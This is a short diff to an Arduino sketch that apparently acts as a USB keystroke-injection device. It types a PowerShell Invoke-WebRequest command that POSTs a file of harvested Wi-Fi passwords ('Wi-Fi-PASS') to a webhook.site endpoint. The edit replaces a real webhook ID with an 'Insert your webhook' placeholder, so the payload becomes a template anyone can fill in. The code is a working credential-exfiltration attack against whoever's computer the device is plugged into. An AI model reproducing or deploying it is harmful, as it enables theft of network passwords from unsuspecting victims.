@@ -44,7 +44,7 @@ void setup() {
   Keyboard.releaseAll();
   delay(500);
   //Sending all passwords to the hook
-  Keyboard.print("powershell Invoke-WebRequest -Uri https://webhook.site/db0742ef-434e-4667-8fa9-04910918fbf2 -Method POST -InFile Wi-Fi-PASS");
+  Keyboard.print("powershell Invoke-WebRequest -Uri https://webhook.site/"Insert your webhook" -Method POST -InFile Wi-Fi-PASS");
   delay(500);
   Keyboard.press(KEY_RETURN);
   delay(500);
